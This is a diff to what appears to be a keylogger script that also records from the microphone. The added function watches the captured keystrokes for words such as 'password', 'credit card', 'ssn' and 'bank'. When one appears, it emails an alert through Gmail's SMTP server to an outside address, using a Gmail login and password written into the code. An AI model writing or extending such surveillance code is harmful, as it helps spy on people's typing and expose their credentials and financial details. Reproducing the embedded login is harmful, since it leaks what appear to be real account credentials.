@@ -19,6 +19,33 @@ number_of_iterations_end = 2
 
 sensitive_words = {"password", "credit card", "ssn", "bank", "confidential"}
 
+
+
+
+def send_alert_email(detected_word):
+    sender_email = "cbitosc24@gmail.com"
+    receiver_email = "nithinkonda142@gmail.com"
+    password = "CBITopensource6942$"  # Use environment variables for security
+
+    subject = "ALERT: Sensitive Word Detected"
+    body = f"The word '{detected_word}' was detected in the key logs. Please check the logs for details."
+    msg = MIMEText(body)
+    msg["Subject"] = subject
+    msg["From"] = sender_email
+    msg["To"] = receiver_email
+
+    try:
+        with smtplib.SMTP("smtp.gmail.com", 587) as server:
+            server.starttls()
+            server.login(sender_email, password)
+            server.sendmail(sender_email, receiver_email, msg.as_string())
+        print("Alert email sent successfully!")
+    except Exception as e:
+        print(f"Failed to send email: {e}")
+
+
+
+
 def microphone():
     fs = 44100
     seconds = microphone_time
